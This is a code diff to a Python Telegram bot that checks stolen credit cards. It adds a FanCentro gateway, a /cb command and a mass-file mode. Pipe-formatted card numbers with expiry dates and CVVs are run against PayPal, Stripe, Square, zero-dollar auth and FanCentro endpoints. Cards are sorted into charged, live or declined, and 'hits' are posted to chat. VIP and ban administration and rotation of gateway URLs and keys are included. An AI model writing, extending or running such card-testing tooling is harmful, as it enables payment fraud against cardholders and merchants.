+    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
+        now = time.time()
+        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
+            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
+            return
+        last_check_time[user_id] = now
+    if not context.args:
+        await update.message.reply_text(premium_emoji("💡 Usage: <code>/auth [card]</code>"), parse_mode="HTML")
+        return
+    card = context.args[0]
+    msg = await update.message.reply_text(premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
+    start_time = time.time()
+    loop = asyncio.get_event_loop()
+    result_dict = await loop.run_in_executor(None, check_auth_sync, card)
+    taken = round(time.time() - start_time, 2)
+    text = await format_auth_response(card, result_dict, taken, user_id, "Single")
+    await msg.edit_text(text, parse_mode="HTML")
+    status = result_dict.get('status', 'declined')
+    if status == "approved":
+        hit_counter += 1
+        user = update.effective_user
+        username = user.username or user.first_name or "Unknown"
+        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Approved", result_dict.get('message', ''), "Auth $0")
+
+# ==================== CB Handler (FanCentro) ====================
+async def cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global hit_counter
+    user_id = update.effective_user.id
+    ALL_USERS.add(user_id)
+    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
+        now = time.time()
+        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
+            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
+            return
+        last_check_time[user_id] = now
+    if not context.args:
+        await update.message.reply_text(premium_emoji("💡 Usage: <code>/cb card|exp_month|exp_year|cvv</code>"), parse_mode="HTML")
+        return
+    card_line = "|".join(context.args)
+    p = fan_parse_line(card_line)
+    if not p:
+        await update.message.reply_text(premium_emoji("❌ صيغة غلط!"), parse_mode="HTML")
+        return
+    card, cvv, em, ey = p
+    card_full = f"{card}|{em}|{ey}|{cvv}"
+    msg = await update.message.reply_text(premium_emoji("💳 Checking FanCentro..."), parse_mode="HTML")
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(None, fan_check_card, card, cvv, em, ey)
+    text = await fan_format_response(card_full, result, user_id, "Single")
+    await msg.edit_text(text, parse_mode="HTML")
+    result_upper = result.upper()
+    if "CHARGE" in result_upper or "INSUFFICIENT" in result_upper:
+        hit_counter += 1
+        user = update.effective_user
+        username = user.username or user.first_name or "Unknown"
+        status_text = "🔥 Charge 5$" if "CHARGE" in result_upper else "💵 Insufficient Funds"
+        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, result, "FanCentro")
+        # ==================== File Panel ====================
 def can_user_check(user_id, mode="file"):
     if user_id in ADMINS: return True
     if BANNED_USERS.get(user_id): return False
@@ -1453,6 +1466,7 @@ async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal")],
             [InlineKeyboardButton("💳 Stripe Check", callback_data="gateway_stripe")],
             [InlineKeyboardButton("💳 Square Check", callback_data="gateway_square")],
+            [InlineKeyboardButton("💳 FanCentro Check", callback_data="gateway_fancentro")],
             [InlineKeyboardButton("🛡 Auth $0 Check", callback_data="gateway_auth")],
         ]
         await update.message.reply_text(premium_emoji("📁 File Received!\nChoose gateway:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -1464,26 +1478,16 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
     gateway_type = query.data.split("_")[1]
-    
     if user_id not in pending_files:
         await query.edit_message_text(premium_emoji("❌ File expired."), parse_mode="HTML")
         return
-    
     user = query.from_user
     username = user.username or user.first_name or "Unknown"
-    
     file_path = pending_files[user_id]["file_path"]
     chat_id = pending_files[user_id]["chat_id"]
     await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
-    
-    gateway_name_map = {
-        "paypal": "PayPal",
-        "stripe": "Stripe",
-        "square": "Square",
-        "auth": "Auth $0"
-    }
+    gateway_name_map = {"paypal": "PayPal", "stripe": "Stripe", "square": "Square", "auth": "Auth $0", "fancentro": "FanCentro"}
     gateway_name = gateway_name_map.get(gateway_type, "Unknown")
-    
     if gateway_type == "paypal":
         task = asyncio.create_task(process_paypal_file(file_path, chat_id, context, gateway_name, username))
     elif gateway_type == "stripe":
@@ -1492,10 +1496,12 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         task = asyncio.create_task(process_square_file(file_path, chat_id, context, gateway_name, username))
     elif gateway_type == "auth":
         task = asyncio.create_task(process_auth_file(file_path, chat_id, context, gateway_name, username))
-    
+    elif gateway_type == "fancentro":
+        task = asyncio.create_task(process_fancentro_file(file_path, chat_id, context, gateway_name, username))
     user_tasks[user_id] = task
     del pending_files[user_id]
 
+# ==================== Process PayPal File ====================
 async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal", username="Unknown"):
     global gateway_index, hit_counter
     user_id = chat_id
@@ -1504,54 +1510,40 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
         approved = live = declined = 0
         card_counter = 0
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
-        
         with open(file_path, 'r', encoding='utf-8') as f:
             lines = f.readlines()
-        
         for line in lines:
             if stop_users.get(user_id):
                 await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                 return
-            
             match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
             if not match: continue
-            
             card_full = match[0]
             card_counter += 1
-            
             gateway_num = 0
             gateway_url = None
             if GATEWAYS:
                 gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                 gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
-            
             status, response = await check_card_api(card_full, gateway_url)
-            
             if status == "approved":
                 approved += 1
                 text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
-                try:
-                    await msg.pin(disable_notification=True)
-                except:
-                    pass
-                
+                try: await msg.pin(disable_notification=True)
+                except: pass
                 hit_counter += 1
                 status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
                 await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
-                
             elif status == "live":
                 live += 1
                 text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
-                
                 hit_counter += 1
                 status_text = "💵 Insufficient Funds"
                 await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
-                
             else:
                 declined += 1
-            
             panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
          ▬▬ [ MASS {gateway_name.upper()} ] ▬▬
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
@@ -1563,20 +1555,16 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
 💳 Card #{card_counter}: <code>{card_full}</code>
 🌐 Gateway: <code>{gateway_name}</code>
 ⚡ Response: <code>{response}</code>"""
-            try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
-            except:
-                pass
-            
+            try: await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+            except: pass
             await asyncio.sleep(1)
-        
         await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete."), parse_mode="HTML")
-        
     except asyncio.CancelledError:
         await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
+# ==================== Process Stripe File ====================
 async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe", username="Unknown"):
     global hit_counter
     if not STRIPE_KEYS:
@@ -1611,10 +1599,8 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
                 approved += 1
                 text = await format_stripe_response(card_full, result, 0, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
-                try:
-                    await msg.pin(disable_notification=True)
-                except:
-                    pass
+                try: await msg.pin(disable_notification=True)
+                except: pass
                 hit_counter += 1
                 status_text = "🔥 Charge"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
@@ -1638,10 +1624,8 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
 💳 Card #{card_counter}: <code>{card_full}</code>
 🔑 Key: <code>{key_id}</code>
 ⚡ Result: <code>{result[:80]}</code>"""
-            try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
-            except:
-                pass
+            try: await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+            except: pass
             await asyncio.sleep(1)
         await context.bot.send_message(chat_id, premium_emoji("🚀 Stripe complete."), parse_mode="HTML")
     except asyncio.CancelledError:
@@ -1649,6 +1633,7 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
+# ==================== Process Square File ====================
 async def process_square_file(file_path, chat_id, context, gateway_name="Square", username="Unknown"):
     global hit_counter
     user_id = chat_id
@@ -1673,10 +1658,8 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
                 approved += 1
                 text = await format_square_response(card_full, result, 0, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
-                try:
-                    await msg.pin(disable_notification=True)
-                except:
-                    pass
+                try: await msg.pin(disable_notification=True)
+                except: pass
                 hit_counter += 1
                 status_text = "🔥 Charge"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result, gateway_name)
@@ -1699,10 +1682,8 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💳 Card #{card_counter}: <code>{card_full}</code>
 ⚡ Result: <code>{result}</code>"""
-            try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
-            except:
-                pass
+            try: await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+            except: pass
             await asyncio.sleep(2)
         await context.bot.send_message(chat_id, premium_emoji("🚀 Square complete."), parse_mode="HTML")
     except asyncio.CancelledError:
@@ -1710,6 +1691,7 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
+# ==================== Process Auth File ====================
 async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0", username="Unknown"):
     global hit_counter
     user_id = chat_id
@@ -1735,10 +1717,8 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
                 approved += 1
                 text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
-                try:
-                    await msg.pin(disable_notification=True)
-                except:
-                    pass
+                try: await msg.pin(disable_notification=True)
+                except: pass
                 hit_counter += 1
                 status_text = "🔥 Approved"
                 await send_hit(context, chat_id, hit_counter, username, status_text, result_dict.get('message', ''), gateway_name)
@@ -1762,10 +1742,8 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💳 Card #{card_counter}: <code>{card_full}</code>
 ⚡ Result: <code>{message[:80]}</code>"""
-            try:
-                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
-            except:
-                pass
+            try: await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+            except: pass
             await asyncio.sleep(1)
         await context.bot.send_message(chat_id, premium_emoji("🚀 Auth complete."), parse_mode="HTML")
     except asyncio.CancelledError:
@@ -1773,11 +1751,65 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
+# ==================== Process FanCentro File ====================
+async def process_fancentro_file(file_path, chat_id, context, gateway_name="FanCentro", username="Unknown"):
+    global hit_counter
+    user_id = chat_id
+    stop_users[user_id] = False
+    try:
+        approved = live = declined = 0
+        card_counter = 0
+        panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 FanCentro Checking..."), parse_mode="HTML")
+        loop = asyncio.get_event_loop()
+        with open(file_path, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+        for line in lines:
+            if stop_users.get(user_id):
+                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+                return
+            p = fan_parse_line(line)
+            if not p: continue
+            card, cvv, em, ey = p
+            card_full = f"{card}|{em}|{ey}|{cvv}"
+            card_counter += 1
+            result = await loop.run_in_executor(None, fan_check_card, card, cvv, em, ey)
+            result_upper = result.upper()
+            if "CHARGE" in result_upper:
+                approved += 1
+                hit_counter += 1
+                await send_hit(context, chat_id, hit_counter, username, "🔥 Charge 5$", result, gateway_name)
+            elif "INSUFFICIENT" in result_upper:
+                live += 1
+                hit_counter += 1
+                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result, gateway_name)
+            else:
+                declined += 1
+            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+         ▬▬ [ MASS FANCENTRO ] ▬▬
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+🔥 Charge: <code>{approved}</code>
+💵 Live: <code>{live}</code>
+❌ Declined: <code>{declined}</code>
+📊 Total: <code>{approved + live + declined}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Card #{card_counter}: <code>{card_full}</code>
+⚡ Result: <code>{result}</code>"""
+            try: await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+            except: pass
+            await asyncio.sleep(1)
+        await context.bot.send_message(chat_id, premium_emoji("🚀 FanCentro complete."), parse_mode="HTML")
+    except asyncio.CancelledError:
+        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+    except Exception as e:
+        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
+
+# ==================== Stop ====================
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = True
     await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")
 
+# ==================== Admin Commands ====================
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -1809,16 +1841,21 @@ async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
-    BANNED_USERS[int(context.args[0])] = True
-    await update.message.reply_text(premium_emoji("✅ Banned."), parse_mode="HTML")
+    try:
+        BANNED_USERS[int(context.args[0])] = True
+        await update.message.reply_text(premium_emoji("✅ Banned."), parse_mode="HTML")
+    except: pass
 
 async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
-    BANNED_USERS.pop(int(context.args[0]), None)
-    await update.message.reply_text(premium_emoji("✅ Unbanned."), parse_mode="HTML")
+    try:
+        BANNED_USERS.pop(int(context.args[0]), None)
+        await update.message.reply_text(premium_emoji("✅ Unbanned."), parse_mode="HTML")
+    except: pass
 
 async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
+    if not context.args: return
     url = context.args[0]
     if url not in GATEWAYS:
         GATEWAYS.append(url)
@@ -1845,13 +1882,17 @@ async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
-    VIP_USERS[int(context.args[0])] = int(time.time()) + (int(context.args[1]) * 86400)
-    await update.message.reply_text(premium_emoji("✅ VIP added."), parse_mode="HTML")
+    try:
+        VIP_USERS[int(context.args[0])] = int(time.time()) + (int(context.args[1]) * 86400)
+        await update.message.reply_text(premium_emoji("✅ VIP added."), parse_mode="HTML")
+    except: pass
 
 async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
-    VIP_USERS.pop(int(context.args[0]), None)
-    await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")
+    try:
+        VIP_USERS.pop(int(context.args[0]), None)
+        await update.message.reply_text(premium_emoji("✅ VIP removed."), parse_mode="HTML")
+    except: pass
 
 async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
@@ -1902,9 +1943,11 @@ async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.sleep(0.05)
         except: continue
 
+# ==================== Error Handler ====================
 async def error_handler(update, context):
     pass
 
+# ==================== Main ====================
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_error_handler(error_handler)
@@ -1912,6 +1955,7 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("cmds", cmds))
     app.add_handler(CommandHandler("pp", pp))
+    app.add_handler(CommandHandler("cb", cb))
     app.add_handler(CommandHandler("auth", auth_check))
     app.add_handler(CommandHandler("st", st_check))
     app.add_handler(CommandHandler("sq", sq_check))
@@ -1940,6 +1984,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_paypal_callback, pattern="^check_paypal$"))
     app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
     app.add_handler(CallbackQueryHandler(check_square_callback, pattern="^check_square$"))
+    app.add_handler(CallbackQueryHandler(check_fancentro_callback, pattern="^check_fancentro$"))
     app.add_handler(CallbackQueryHandler(check_auth_callback, pattern="^check_auth$"))
     app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
     app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
